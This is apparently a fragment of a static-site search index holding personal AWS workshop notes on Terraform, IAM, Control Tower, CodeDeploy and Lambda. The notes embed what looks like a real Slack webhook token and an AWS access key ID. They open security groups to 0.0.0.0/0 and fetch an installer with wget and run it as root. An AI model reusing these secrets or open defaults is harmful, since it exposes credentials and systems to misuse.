[\u0026#34;0.0.0.0/0\u0026#34;] } ingress { from_port = 8080 to_port = 8080 protocol = \u0026#34;tcp\u0026#34; cidr_blocks = [\u0026#34;0.0.0.0/0\u0026#34;] } egress { from_port = 0 to_port = 0 protocol = \u0026#34;-1\u0026#34; cidr_blocks = [\u0026#34;0.0.0.0/0\u0026#34;] prefix_list_ids = [] } tags = { Name = \u0026#34;${var.env_prefix}-sg\u0026#34; } } resource \u0026#34;aws_internet_gateway\u0026#34; \u0026#34;myapp-igw\u0026#34; { vpc_id = aws_vpc.myapp-vpc.id tags = { Name = \u0026#34;${var.env_prefix}-internet-gateway\u0026#34; } } resource \u0026#34;aws_route_table\u0026#34; \u0026#34;myapp-route-table\u0026#34; { vpc_id = aws_vpc.myapp-vpc.id route { cidr_block = \u0026#34;0.0.0.0/0\u0026#34; gateway_id = aws_internet_gateway.myapp-igw.id } # default route, mapping VPC CIDR block to \u0026#34;local\u0026#34;, created implicitly and cannot be specified. tags = { Name = \u0026#34;${var.env_prefix}-route-table\u0026#34; } } # Associate subnet with Route Table resource \u0026#34;aws_route_table_association\u0026#34; \u0026#34;a-rtb-subnet\u0026#34; { subnet_id = aws_subnet.myapp-subnet-1.id route_table_id = aws_route_table.myapp-route-table.id } output \u0026#34;server-ip\u0026#34; { value = aws_instance.myapp-server.public_ip } resource \u0026#34;aws_instance\u0026#34; \u0026#34;myapp-server\u0026#34; { ami = var.ami_id instance_type = var.instance_type key_name = \u0026#34;tf-cli-keypair\u0026#34; associate_public_ip_address = true subnet_id = aws_subnet.myapp-subnet-1.id vpc_security_group_ids = [aws_security_group.myapp-sg.id] availability_zone\t= var.avail_zone tags = { Name = \u0026#34;${var.env_prefix}-server\u0026#34; } } terraform.tfvars - Terraform provider\r# Network and Instance variables vpc_cidr_block = \u0026#34;10.0.0.0/16\u0026#34; subnet_1_cidr_block = \u0026#34;10.0.1.0/24\u0026#34; avail_zone = \u0026#34;ap-southeast-1b\u0026#34; env_prefix = \u0026#34;web\u0026#34; my_ip = \u0026#34;\u0026lt;myip\u0026gt;/32\u0026#34; ami_id = \u0026#34;ami-04f73ca9a4310089f\u0026#34; Installation Terraform plan:\ndocker-compose run –rm terraform plan process\rTerraform apply:\ndocker-compose run --rm terraform apply --auto-approve process\rAWS Instance checking:\nAdd Keypair permission:\nchmod 400 tf-cli-keypair.pem SSH to EC2 Instances:\nssh -i tf-cli-keypair.pem ec2-user@13.250.64.49 AWS Instance checking: "
},
{
	"uri": "http://localhost:1313/aws-ws/13-ha/13.1-elb/",
	"title": "ELB",
	"tags": [],
	"description": "",
	"content": "Elastic Load Balancing ELB "
},
{
	"uri": "http://localhost:1313/aws-ws/3-config/3.1-iac/",
	"title": "IaC",
	"tags": [],
	"description": "",
	"content": "Infrastructure as Code (IaC) with Terraform and AWS provides scalable, consistent, and automated infrastructure management. It enables version control, cost optimization, and flexibility in defining complex configurations. With modularity and reusability, fast iteration, and vendor agnosticism, it ensures reliable and efficient cloud resource provisioning, driving business agility and innovation.\nContent EC2 S3 "
},
{
	"uri": "http://localhost:1313/aws-ws/10-awssecuview/10.1-iam/",
	"title": "Identity and Access Management",
	"tags": [],
	"description": "",
	"content": "Best practices Overview\nUsing IAM roles to grant access to third parties is more secure than sharing account credentials. Having a clear strategy for managing identities is important to the security of your AWS environment.\nWorkflow\nLogin AWS Console\nIAM \u0026gt; Roles \u0026gt; Create Role\nSelect trusted entiy: AWS account An AWS account \u0026gt; Another AWS account: Account ID: XXX Options \u0026gt; Require external ID \u0026hellip; NEXT Add permissions \u0026gt; Permissions policies : AmazonEC2ReadOnlyAccess Role name: EC2ReadOnlyAccess CREATE ROLE Roles : EC2ReadOnlyAccess\nTrust relationships \u0026gt; Edit trust policy line 7: \u0026ldquo;AWS\u0026rdquo;: \u0026ldquo;arn:aws:iam::\u0026hellip;:user/tuanta\u0026rdquo; UPDATE POLICY IAM \u0026gt; Policy \u0026gt; Create policy\nSpecify permission : STS (Security Token Service) Actions allowed \u0026gt; Assess level: Write: AssumeRole Resources: ALL (keep simple for lab) NEXT Policy name: AssumeRolePolicy CREATE POLICY IAM \u0026gt; User \u0026gt; User name: tuanta\nPermisions \u0026gt; Add permissions \u0026gt; Attach policies directly Permission policies: AssumeRolePolicy ADD PERMISSIONS Login IAM User\nClick \u0026quot; Switch role\u0026quot; Input information \u0026gt; Switch Role IAM ROLE Switch Role AWS IAM With IAM, you can manage access for internal and external uers IAM entities include users, groups, policies, and roles IAM Users and Groups A user consists of a name and credentials Group users to create user groups IAM allows you to manage identities outside of AWS Ex: Microsoft Active Directory Use identity providers that support OpenID Connect (OIDC) or Security Assertion Markup Languages (SAML) 2.0 Policy - An IAM policy is a document that contains permissions IAM Role Similar to an IAM User - it is an identity with permissions Not uniquely associated with a user Intended to be assumed by anyone who needs it Roles have policies associated with them IAM Role - AWS does not permit this access by default Attaching an IAM Role with appropriate permissions Use IAM roles to grant other AWS account access to permissions in your account Ex: Grant access to third party to upload objects to an S3 bucket in your account Share your logs with a third party for monitoring and analysis. "
},
{
	"uri": "http://localhost:1313/aws-ws/1-intro/",
	"title": "Introduction",
	"tags": [],
	"description": "",
	"content": "Home | Sile Project\nOverview AWS provides a flexible and scalable platform that enables businesses to innovate and grow without the need to invest in and manage their own infrastructure. It\u0026rsquo;s used by organizations of all sizes across various industries for a wide range of use cases, from startups building new applications to large enterprises migrating their IT infrastructure to the cloud.\nContent Introduction Prepairation Configure Cleanup "
},
{
	"uri": "http://localhost:1313/aws-ws/5-cloudquest/5.1-compute/5.1.1-learn/",
	"title": "Learn",
	"tags": [],
	"description": "",
	"content": "AWS Global Overview AWS Global Infrastructure Benefits AWS Well-Architected Amazon S3 Amazon S3 More Feature Amazone S3 Access-Management "
},
{
	"uri": "http://localhost:1313/aws-ws/5-cloudquest/5.6-vpc/5.6.1-learn/",
	"title": "Learn",
	"tags": [],
	"description": "",
	"content": "1. Amazon VPC Overview 2. Amazon VPC Concepts 3. Amazon VPC Security 4. Amazon VPC - Internet Connectivity 5. Amazon VPC Peering Connections "
},
{
	"uri": "http://localhost:1313/aws-ws/5-cloudquest/5.8-security/5.8.1-learn/",
	"title": "Learn",
	"tags": [],
	"description": "",
	"content": "1. AWS Security and Complicance Overview 2. AWS Share Responsibility Model Overview AWS Customer EC2 Lambda 3. AWS IAM - Overview 4. AWS IAM - Manage Permissions 5. AWS IAM - Manage IAM Roles 6. AWS IAM Features - Access Analysis "
},
{
	"uri": "http://localhost:1313/aws-ws/2-prepair/2.2-aws/",
	"title": "AWS",
	"tags": [],
	"description": "",
	"content": "Amazon Web Services (AWS) is a comprehensive and widely used cloud computing platform provided by Amazon. It offers a vast array of services, allowing individuals and businesses to build and deploy scalable applications and services without the need to invest in physical infrastructure\nAWS CLI The AWS Command Line Interface (CLI) is a powerful tool provided by Amazon Web Services (AWS) that allows you to interact with AWS services directly from your command line or terminal It provides a convenient and scriptable way to manage your AWS resources without needing to use the AWS Management Console AWS CLI configuration overview\nAWS CLI User: tf-cli\r# Create User docker-compose run --rm aws iam create-user --user-name tf-cli # List Users docker-compose run --rm aws iam list-users # Delete User docker-compose run --rm aws iam delete-user --user-name tf-cli # create access key for user docker-compose run --rm aws iam create-access-key --user-name tf-cli \u0026gt; tf_cli-access_key.json # List Access key or User docker-compose run --rm aws iam list-access-keys --user-name tf-cli # Delete Access key docker-compose run --rm aws iam delete-access-key --user-name tf-cli --access-key-id AKIAZI2LEZRR5T3WDM5U # Attach admin access: docker-compose run --rm aws iam attach-user-policy --user-name tf-cli --policy-arn arn:aws:iam::aws:policy/AdministratorAccess # User Permission docker-compose run --rm aws iam list-attached-user-policies --user-name tf-cli # Detach Policy docker-compose run --rm aws iam detach-user-policy --user-name tf-cli --policy-arn arn:aws:iam::aws:policy/AdministratorAccess # Create Policy custom file ec2-limited-access-policy.json # Create a Custom IAM policy: docker-compose run --rm aws iam create-policy --policy-name EC2FullAccessAPSouthEast1 --policy-document file://ec2-limited-access-policy.json # Attach Policy docker-compose run --rm aws iam attach-user-policy --user-name tf-cli --policy-arn arn:aws:iam::637423373411:policy/EC2FullAccessAPSouthEast1 Configuration Prepair and run docker compose file\ndocker-compose run --rm aws --version AWS Access \u0026amp; Secret Create keypair to access AWS Instances: tf-cli-keypair.pem\ndocker-compose run --rm aws ec2 create-key-pair --key-name tf-cli-keypair --query \u0026#39;KeyMaterial\u0026#39; --output text \u0026gt; tf-cli-keypair.pem Create AWS Account for Terraform use AWS CLI: tf-cli\ndocker-compose run --rm aws iam create-user --user-name tf-cli AWS Checking keypair: Create Access Key \u0026amp; export to local\ndocker-compose run --rm aws iam create-access-key --user-name tf-cli \u0026gt; tf_cli-access_key.json Create policy and configure to allow access EC2 and Limit Region\nCreate a custom policy file: ec2-limited-access-policy.json { \u0026#34;Version\u0026#34;: \u0026#34;2012-10-17\u0026#34;, \u0026#34;Statement\u0026#34;: [ { \u0026#34;Effect\u0026#34;: \u0026#34;Allow\u0026#34;, \u0026#34;Action\u0026#34;: \u0026#34;ec2:*\u0026#34;, \u0026#34;Resource\u0026#34;: \u0026#34;*\u0026#34;, \u0026#34;Condition\u0026#34;: { \u0026#34;StringEquals\u0026#34;: { \u0026#34;ec2:Region\u0026#34;: \u0026#34;ap-southeast-1\u0026#34; } } } ] } Create a IAM policy: EC2FullAccessAPSouthEast1 docker-compose run --rm aws iam create-policy --policy-name EC2FullAccessAPSouthEast1 --policy-document file://ec2-limited-access-policy.json Attach the Policy to the IAM User: (tf-cli) docker-compose run --rm aws iam attach-user-policy --user-name tf-cli --policy-arn arn:aws:iam::637423373411:policy/EC2FullAccessAPSouthEast1 AWS Checking User: "
},
{
	"uri": "http://localhost:1313/aws-ws/10-awssecuview/10.2-org/",
	"title": "AWS Organizations",
	"tags": [],
	"description": "",
	"content": "Best practices Overview\nSCPs are simple powerful tools to limit actions of member accounts. And also, using AWS Organizations can be a strategic architectural decision, allowing you to easily organize and gain control over multiple AWS accounts.\nProcess\nManagements \u0026amp; Govermance \u0026gt; AWS Organizations \u0026gt; Create an organization Add an AWS account \u0026gt; Invite an existing AWS account\nEmail address or account ID of the AWS accounts to invite: AWS ID SEND INVITATION AWS Organizations \u0026gt; View 1 invitation \u0026gt; Accept invitation\nAWS Organizations \u0026gt; AWS accounts \u0026gt; Select Root \u0026gt; Actions \u0026gt; Create new\nCreate organizational unit in Root Organizational unit name: Production \u0026gt; CREATE ORGANIZATIONAL UNIT AWS Organizations \u0026gt; AWS accounts \u0026gt; Select account in Other OU and move to new OU: Production\nAWS Organizations \u0026gt; Services \u0026gt; Integrated services : Disable (default) AWS Organizations \u0026gt; Policies \u0026gt; Service control policies : Enable service control policies Available policies \u0026gt; Create policy \u0026gt; Policy name: EC2PolicyForMemberAccounts Edit statement \u0026gt; Add actions \u0026gt; Choose a service EC2 Access level - list RunInstances Add a resource \u0026gt; ADD Service: EC2 Resource type: All Resources ADD RESOURCE CREATE POLICY AWS Organizations \u0026gt; AWS accounts \u0026gt; ACCOUNT Polices \u0026gt; Attach: EC2PolicyForMemberAccounts ATTACH POLICY Verify : EC2 - Instances - Launch instances AWS Organizations Uses for Multiple AWS Accounts\nOrganizations use multiple AWS accounts to:\nSegregate environments Comply with regulations Create security boundaries Work around services limits Multiple AWS accounts create administrative and architectural challenges\nAWS Organizations and AWS Control Tower are commonly used to manage multiple AWS accounts\nAWS Organiztions allows you to consolidate multiple AWS accounts into an organization\nAWS Organizations\nUse AWS Organizations to: Invite other AWS accounts and manage them centrally Consolidate billing in the management account Group accounts into organizational units (OUs) Implement service control policies (SCPs) to define maximum permissions for member accounts "
},
{
	"uri": "http://localhost:1313/aws-ws/5-cloudquest/5.2-cloudfirst/",
	"title": "Cloud First Steps",
	"tags": [],
	"description": "",
	"content": "Business Request The island\u0026rsquo;s stabilization system is failing and needs increased reliability and availability for its computational modules.\nLearning Objectives Summarize AWS Infrastructure benefits. Describe AWS Regions and Availability Zones. Deploy Amazon EC2 instances into multiple Availability Zones. "
},
{
	"uri": "http://localhost:1313/aws-ws/8-devopsaws/8.2-build/",
	"title": "CodeBuild",
	"tags": [],
	"description": "",
	"content": "Overview AWS CodeBuild is a fully managed continuous integration service that compiles source code, runs tests, and produces software packages that are ready to deploy. It is serverless. So you don\u0026rsquo;t need to provision or manage any servers. CodeBuild scales continuously, and processes multiple builds concurrently. CodeBuild Overview Create and test your first build Developer Tools \u0026gt; CodeBuild \u0026gt; Create project Project name: DevOpsAppBuild Source: AWS CodeCommit Repository: cicd-repo Reference type: Branch: master Environment: Managed image Service role: New service role - Role name: coldebuild-DevOpsAppBuild-service-role Operating system: Amazon Linux 2 Runtime(s): Standard Image: aws/codebuild/amazonlinux2-x86_64-standard:3.0 VPC Compute Buildspec Use a buildspec file: buildspec.yaml CloudWatch: enable Build project - Start build\nCheck: Build (Codebuild) - Build history\nbuildspec.yaml\nversion: 0.2 phases: install: runtime-versions: nodejs: 10 commands: - echo \u0026#34;installing something\u0026#34; pre_build: commands: - echo \u0026#34;This is the pre build phase\u0026#34; build: commands: - echo \u0026#34;This is the build phase\u0026#34; - echo \u0026#34;Here we can run some tests\u0026#34; - grep -Fq \u0026#34;Welcome\u0026#34; index.html post_build: commands: - echo \u0026#34;This is the post build phase\u0026#34; artifacts: files: - \u0026#39;**/*\u0026#39; name: DevOpsAppArtifacts Environment variables and Parameter Ex: add command version: 0.2 phases: install: runtime-versions: nodejs: 10 commands: - printenv - echo \u0026#34;installing something\u0026#34; ... Can add in Console Parameter\nAWS Systems Manager \u0026gt; Parameters Add permission access IAM - Role : coldebuild-DevOpsAppBuild-service-role Attach policy: AmazonSSMReadOnlyAccess Rebuild to test (secure database password with SSM) Artifact and S3 S3 \u0026gt; Create bucket\nName: cicddevopsartifacts Developer Tools \u0026gt; CodeBuild \u0026gt; Build projects \u0026gt; DevOpsAppBuild \u0026gt; Edit Artifacts\nType: Amazon S3 Bucket name: cicddevopsartifacts Namespace type - optional : Build ID Artifacts packing: Zip Update Artifacts Start build : Upload_Artifacts : Successded\nS3 check: Download to local "
},
{
	"uri": "http://localhost:1313/aws-ws/12-automate/12.2-lambda/",
	"title": "Lambda",
	"tags": [],
	"description": "",
	"content": "Going serverless with Lambda AWS Lambda lets you run code without provisioning servers. Lambda abstracts the underlying infratructure. Demo: AWS Services \u0026gt; Compute \u0026gt; Lambda \u0026gt; Create functions Blue/Green Buleprint name: Get S3 object Function name: retrieve-s3-data Runtime: Python Excution role: Create a new role: Role name: lambda-s3-iam-role Lambda funtion code: checking Workflow: The function has a handler (lambda_hander) that serves as the entry point. It extracts event data and contacts (context) paths to it. The function then extracts the bucket name (bucket) and the object key from the event data. It attempts to retrieve the object (get_object) from the specified bucket. If the retrieval is successful, the function prints the object\u0026rsquo;s content type. S3 trigger Bucket: s3/processing-bucket-1 Event types: PUT POST CREATE FUNCTION Check Code \u0026gt; Add 1 line \u0026gt; Deploy to Save the changes Check Trigger and start the code Upload files to Bucket and check Cloudwatch "
},
{
	"uri": "http://localhost:1313/aws-ws/7-fcj/7.2-lambda/",
	"title": "Lambda",
	"tags": [],
	"description": "",
	"content": "FCJ: Optimizing EC2 Cost with Lambda Source: https://000022.awsstudygroup.com/vi/\nPrepairation: VPC: lambda-lab Auto-generation CIDR: 10.0.0.0/16 Subnet: lambda-lab-subnet-public\u0026hellip; Enable auto-assign IPv4 Address Security Group: lambda-lab Inbound rules: SSH - ICMP - HTTP - HTTPS EC2 Instance: lambda-lab-instance Key pair: lambda-lab-key VPC: lambda-lab-vpc Subnet: lambda-lab-subnet-public SG: lambda-lab Tags: Key: environment-auto - Value: true IAM Role: dc-common-lambda-role Permision: AmazonEC2FullAccess CloudWatchFullAccess Slack: Workspace: aws-lambda-labs New channel: notification Webhook URL: COPY Link Create Lambda Function 2.1 Function stop instance:\nLambda Function name: dc-common-lambda-auto-stop Runtime: Python 3.8 Architecture: x86_64 Existing role: dc-common-lambda-role Configure \u0026gt; Environment variables: Key: environment_auto - Value: true Code : lambda_function You need to change webhook_url to receive notifications to Slack. import boto3 Deploy expand: lambda_funtion\rimport boto3 import os import json import urllib3 ec2_resource = boto3.resource(\u0026#39;ec2\u0026#39;) http = urllib3.PoolManager() webhook_url = \u0026#34;https://hooks.slack.com/services/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\u0026#34; def lambda_handler(event, context): environment_auto= os.environ.get(\u0026#39;environment_auto\u0026#39;) if not environment_auto: print(\u0026#39;Target is empty\u0026#39;) else: instances = ec2_resource.instances.filter( Filters=[{\u0026#39;Name\u0026#39;: \u0026#39;tag:environment_auto\u0026#39;, \u0026#39;Values\u0026#39;: [environment_auto]}] ) if not list(instances): response = { \u0026#34;statusCode\u0026#34;:500, \u0026#34;body\u0026#34;: \u0026#34;Target Instance is None\u0026#34; } else: action_stop = instances.stop() sent_slack(action_stop) response = { \u0026#34;statusCode\u0026#34;:200, \u0026#34;body\u0026#34;: \u0026#34;EC2 Stopping\u0026#34; } return response def sent_slack(action_stop): list_instance_id = [] if (len(action_stop)\u0026gt;0) and (\u0026#34;StoppingInstances\u0026#34; in action_stop[0]) and (len(action_stop[0][\u0026#34;StoppingInstances\u0026#34;])\u0026gt;0): for i in action_stop[0][\u0026#34;StoppingInstances\u0026#34;] : list_instance_id.append(i[\u0026#34;InstanceId\u0026#34;]) msg = \u0026#34;Stopping Instances ID:\\n %s\u0026#34; %(list_instance_id) data = {\u0026#34;text\u0026#34;:msg} r = http.request(\u0026#34;POST\u0026#34;, webhook_url, body = json.dumps(data), headers = {\u0026#34;Content-Type\u0026#34;:\u0026#34;application/json\u0026#34;}) else: print (\u0026#39;Not found Instances Stop\u0026#39;) Cloud watch - Amazone Event Brigde Rules - Create rule Name: dc-common-lambda-auto-stop Description: dc-common-lambda-auto-stop Select : Schedule Schedule pattern: A schedule that runs at a regular rate, such as every 10 minutes. rate: 9 - Hours Select target: Types: AWS service Target: Lambda Function Function: dc-common-lambda-auto-stop Create rule Check result Lamba Function: dc-common-lambda-auto-start Test - Test event action: Create new event Event name: instance-stop Save -\u0026gt; Test Slack: Notification check incomming-webhook message Instances: lambda-lab-instance Status: Stopped Learn Source:\nServerless Computing with AWS Lambda\nLearning Amazon Web Services Lambda (Is Processing)\nChallenge:\nLambda Function API Gateway Solution:\nCreate funtion: Lambda \u0026gt; Funtions\nFuntion name: challenge1 Add Trigger: API Gateway Create a new API Security: Open Code - Edit index.mjs \u0026gt; Deploy Configuration: Check API Endpoint Use Postman to POST value\nInput valuse 1, value 2 Clean up your AWS environment\nDelete all AWS resources Delete all the endpoints sam delete Workflow:\nLambda Function API Gateway AWS Account Group:\nGroup name: new-admin Permission: AdministratorAccess User:\nUser name: lambdauser Group: new-admin Download : Access key ID Secret access key AWS Lambda Severless \u0026amp; Lambda\rAWS Lambda 2 Amazon API Gateway \u0026amp; Use Case\rAWS API Gateway 2 Use Case Amazon S3\rAWS S3 2 Amazon DynamoDB \u0026amp; SQS \u0026amp; Kinesis\rDynamoDB SQS Kinesis Amazon Cloudwatch\rCloudWatch - 2.1 Lambda Function\nFuntion name: my-lambda-function Runtime: Node.js 18.x Architecture: x86_64 Lambda: my-lambda-function\nEdit Test configuration and Deploy Configure Test Event Event name: test-event Template: hello-world Run Test - test-event 2.2 Add API Gateway as a trigger to Lambda\nLambda : my-lambda-function\nAdd trigger:\nSelect a source: API Gateway API type: HTTP API Security: Open Configuration check:\n- - - Edit Code: - - - - 2.3 Test your function with Postman\nAPI Development: https://www.postman.com/\n- - 2.4 Monitor your funtion with CloudWatch metrics\nthe metrics that provides the Lambda function. 2.5 Adding CloudWatch Logs\nAdd log to code : index.mjs Test API with Postman Monitor - View CloudWatch logs Check: CloudWatch \u0026gt; Log Groups \u0026gt; /aws/lambda/my-lambda-function Login Lambda console \u0026gt; Monitor \u0026gt; Logs - - "
},
{
	"uri": "http://localhost:1313/aws-ws/5-cloudquest/5.1-compute/5.1.2-plan/",
	"title": "Plan",
	"tags": [],
	"description": "",
	"content": "Diagram Steps "
},
{
	"uri": "http://localhost:1313/aws-ws/3-config/3.1-iac/3.1.2-s3/",
	"title": "S3",
	"tags": [],
	"description": "",
	"content": "In this Workshop we will automate create an S3 bucket\nOverview S3 Bucket AWS User: tf-s3-cli AWS Policy: AmazoneS3FullAccess Bucket name: 090524-tfs3bucket Review Configuration We will use AWS user have AdministratorAccess to create IAM User, Access and Secret Key, Policy and Attach permission AmazoneS3FullAccess to User tf-s3-cli. After that add Access and Secret Key to .env to use Docker-compose.\nAWS : User Access , Secret Key\r# check aws version docker-compose run --rm aws --version # create aws user docker-compose run --rm aws iam create-user --user-name tf-s3-cli # create access key for user docker-compose run --rm aws iam create-access-key --user-name tf-s3-cli \u0026gt; tf-s3-cli-access-key.json Attached Amazon S3 Full Access\r# AmazoneS3FullAccess docker-compose run --rm aws iam attach-user-policy --user-name tf-s3-cli --policy-arn arn:aws:iam::637423373411:policy/AmazoneS3FullAccess Container: Docker-compose.yml version: \u0026#39;3\u0026#39; services: # Terraform terraform: image: hashicorp/terraform:latest volumes: - .:/terraform working_dir: /terraform # AWS CLI\u0026#39; aws: image: anigeo/awscli environment: AWS_ACCESS_KEY_ID: \u0026#34;${AWS_ACCESS_KEY_ID}\u0026#34; AWS_SECRET_ACCESS_KEY: \u0026#34;${AWS_SECRET_ACCESS_KEY}\u0026#34; AWS_REGION: \u0026#34;${AWS_REGION}\u0026#34; AWS_DEFAULT_REGION: ap-southeast-1 volumes: - $PWD:/app working_dir: /app .env - aws access \u0026amp; secret key\rAWS_ACCESS_KEY_ID=xxx AWS_SECRET_ACCESS_KEY=xxx AWS_REGION=ap-southeast-1 Terraform\nmain.tf # Variables variable \u0026#34;access_key\u0026#34; { type = string sensitive = true } variable \u0026#34;secret_key\u0026#34; { type = string sensitive = true } # Tf provider terraform { required_providers { aws = { source = \u0026#34;hashicorp/aws\u0026#34; version = \u0026#34;~\u0026gt; 4.16\u0026#34; } } required_version = \u0026#34;\u0026gt;= 1.2.0\u0026#34; } # IAM access provider \u0026#34;aws\u0026#34; { region = \u0026#34;ap-southeast-1\u0026#34; access_key = var.access_key secret_key = var.secret_key } # S3 Bucket resource \u0026#34;aws_s3_bucket\u0026#34; \u0026#34;example\u0026#34; { bucket = \u0026#34;090524-tfs3bucket\u0026#34; tags = { Name = \u0026#34;My bucket\u0026#34; Environment = \u0026#34;Dev\u0026#34; } } Installation AWS Version\ndocker-compose run --entrypoint aws aws --version Amazon S3 Permission\ndocker-compose run --entrypoint aws s3 ls Create S3 Bucket\ndocker-compose run --rm terraform init docker-compose run --rm terraform plan docker-compose run --rm terraform apply --auto-approve AWS Console review\nDestroy S3 Bucket\ndocker-compose run --rm terraform destroy --auto-approve Expand detroy S3 process\r"
},
{
	"uri": "http://localhost:1313/aws-ws/13-ha/13.2-sns/",
	"title": "SNS &amp; SQS",
	"tags": [],
	"description": "",
	"content": "Architechting Loosely Coupled Applications Coupling refers to the interdependence between different components in a system. Loose coupling aims to minimize the dependencies between components. Amazon Simple Queue Service (SQS) is a queing service SQS works on a polling mechanism "
},
{
	"uri": "http://localhost:1313/aws-ws/2-prepair/",
	"title": "Workshop Prepairation",
	"tags": [],
	"description": "",
	"content": "Home | Container | AWS | Terraform | Git | Local\nWorkshop-101 Overview : The project focuses on automating the deployment of a server in the AWS Cloud using AWS CLI, Docker Compose, and Terraform. Terraform is used to define and provision the necessary infrastructure components, while Docker Compose is employed to manage the Docker containers for the server application. The AWS CLI is used for interacting with AWS services programmatically. By integrating these tools, the project aims to streamline the deployment process, reduce manual effort, and ensure consistency and scalability in the AWS environment. Workflow : process link AWS Workshop Practice View Project at : Cloud DevSecOps with Hashicorp, Palo Alto Networks \u0026amp; AWS\nOverview :\nThis workshop will demonstrate how to leverage infrastructure as code (IaC) and DevSecOps patterns to automate, scale, and improve the security posture of cloud infrastructure and applications. We will create a pipeline that ensures our configurations are secure and compliant from code to cloud. Workshop-102 Overview : CICD is processing \u0026hellip; Workflow : process link Contents Docker AWS Teraform Git Local "
},
{
	"uri": "http://localhost:1313/aws-ws/10-awssecuview/10.3-tower/",
	"title": "AWS Control Tower",
	"tags": [],
	"description": "",
	"content": "Best practices Managements \u0026amp; Govermance \u0026gt; AWS Control Tower setup \u0026gt; Set up landding zone Home region: ES East (N.Virginia) Region deny settings: Not Enabled NEXT OUs Foundation OU - Name: Security Additional OU - Opt out of creating OU NEXT Configure shared accounts Log archive account Create new account: XXX email Audit account Create new account: XXX email NEXT Additional configurations Seft-managed AWS account access with IAM Identity Center or another method AWS CloudTrail configuration : Not enabled \u0026gt; Confirm NEXT Check : I understand the permissions \u0026hellip; SET UP LANDING ZONE AWS Control Tower \u0026gt; Controls libray \u0026gt; All controls \u0026gt; Check: Amazon s3 :[AWS-GR_S3_ACCOUNT_LEVEL..] \u0026gt; Enable control Enable control on OU : - Check Name: Security \u0026gt; Enable control on OU AWS Control Tower Used to manage security and compliance of multiple accounts Govern a multi-account AWS environment following best practices Controls are rules that help with governance Control Categories\nControls are categorized based on:\nBehavior Preventive ( Preventive controls) Disallow actions that lead to policy violations For example: Require attached EBS volumees to be configured to encript data at rest Disallow bucket policy changes for S3 buckets Detective( Detective controls ) Check for noncompliance of resources For example: Detect EC2 instance that have a public IPv4 address RDS instances should have automatic backups enabled Proactive ( Proactive Controls ) Scan resources before provisioning to ensure they\u0026rsquo;re compliant Noncompliant resources aren\u0026rsquo;t provisioned For example: Require S3 buckets to have \u0026quot; Block public access\u0026quot; settings configured Require application load balancers to have logging activated Guidance (Control Guidance) Mandatory (Mandatory Controls) Are always applied and can not changed Enable CloudTrail in all available regions Disallow changes to CloudWatch set up by Control Tower Strongly recommended Enfore common best practices for well-architected, multi-account environments Disallow creation of access keys for the root user Detect whether public read access to S3 buckets is allowed Elective Allow you to track or lock down actions commonly restricted in enterprise environments Disallow changes to logging configuration for S3 buckets Detect whether MFA is enabled for IAM users Strongly recommended and elective controls are optional\nControl Tower can provision new AWS accounts that adhere to security and compliance requiments\nAWS Control Tower\nControl Tower creates a landing zone-a container for your accounts Landing zone contains Security OU with two accounts: Log archive account Log archive account contains logging information for all enrolled accounts Audit account Audit account can be used to perform audits and automated security operations "
},
{
	"uri": "http://localhost:1313/aws-ws/8-devopsaws/8.3-deploy/",
	"title": "CodeDeploy",
	"tags": [],
	"description": "",
	"content": "Overview With CodeDeploy, we can automate deployment on Amazon EC2 servers, on-prem servers, and serverless applications running on Lambda and on ECS. A very good feature of CodeDeploy is that you have minimal downtime for your applications, and you can also set up blue-green deployments for EC2 instances. CodeDeploy Overview . Instance setup IAM Role:\nRole name: EC2RoleforCodeDeploy Permission: AmazonS3ReadOnlyAccess EC2 - Launch Instances\nAmazon Linux 2 AMI Type: t2.micro VPC: IAM Role: EC2RoleforCodeDeploy Key pair: virginiakeypair SSH to EC2 instance (Use PuTTy \u0026amp; Keypair)\nInstall CodeDeploy agent\nCodeDeployConfig.md\r# Installing the CodeDeploy agent on EC2 sudo yum update -y sudo yum install -y ruby wget wget https://aws-codedeploy-eu-west-1.s3.eu-west-1.amazonaws.com/latest/install chmod +x ./install sudo ./install auto sudo service codedeploy-agent status # create a bucket and enable versioning aws s3 mb s3://aws-devops-cicddemo --region us-east-1 --profile aws-devops aws s3api put-bucket-versioning --bucket aws-devops-cicddemo --versioning-configuration Status=Enabled --region us-east-1 --profile aws-devops # deploy the files into S3 aws deploy push --application-name CodeDeployDemo --s3-location s3://aws-devops-cicddemo/codedeploy-demo/app.zip --ignore-hidden-files --region us-east-1 --profile aws-devops Add Tag to EC2 instance Key: Name - Value: webserver Key: Environment - Value: Development First deployment IAM Role - AWS Services - CodeDeploy\nRole name: CodeDeployRole IAM User: (for AWS CLI)\nCreate Access key ID \u0026amp; Secret access key AWS CLI configure:\naws configure \u0026ndash;profile aws-devops AWS Access Key ID: AWS Secret Access Key: Default region name: json Create S3 buccket and enable versioning : aws-devops-cicddemo\nconfigure in CodeDeployConfig.md Up load files into S3: app.zip\nDeveloper Tools \u0026gt; CodeDeploy \u0026gt; Applications \u0026gt; Create application\nApplication name: CodeDeployDemo\nCode platform: EC2/On-premises\nDeployment groups: Create deployment group Deployment group name: MyDevInstances\nService role: /CodeDeployDemo\nDeployment type: In-place\nEnvironment configuration\nAmazon EC2 instances Key: Environment - Value: Development Create deployment group Create deployment\nRevision type: My application is stored in Amazon S3 Revision location: \u0026hellip;./app.zip Create Deployment SSH to EC2 instance\ncd /var/www/htmll ls index.html EC2 instance check Security Group\nInbound rules: HTTP / SSH 80/22 0.0.0.0/0 Check via DNS Configurations EC2 - Launch Instances:\nNumber of instances: 4 Amazon Linux 2 AMI Type: t2.micro VPC: IAM Role: EC2RoleforCodeDeploy User data: #!bin/bash sudo yum update -y sudo yum install -y ruby wget wget https://aws-codedeploy-eu-west-1.s3.eu-west-1.amazonaws.com/latest/install chmod +x ./install sudo ./install auto sudo service codedeploy-agent status Key pair: virginiakeypair Manage Tags for 4 instances Key: Name - Value: ProdServer Key: Environment - Value: Production Create New deployment group name: MyProdInstances\nService role: /CodeDeployRole\nDeployment type: In-place\nEnvironment configuration\nAmazon EC2 instances Key: Environment - Value: Production Deployment settings:\nDeployment configuration: CodeDeployDefault.OneAtATime (use in this lab) or manual create\nCreate deployment configuration Deployment configuration name: 80percentinstance Minimum healthy hosts: Percentage Value: 80 Create deployment group\nCreate deployment\nDeployment group: MyProdInstances Revision type: S3: app.zip -\u0026gt; Create Check Website DNS\nappspec.yml version: 0.0 os: linux files: - source: /index.html destination: /var/www/html/ hooks: ApplicationStop: - location: scripts/stop_server.sh timeout: 300 runas: root BeforeInstall: - location: scripts/install_dependencies.sh timeout: 300 runas: root AfterInstall: - location: scripts/after_install.sh timeout: 300 runas: root ApplicationStart: - location: scripts/start_server.sh 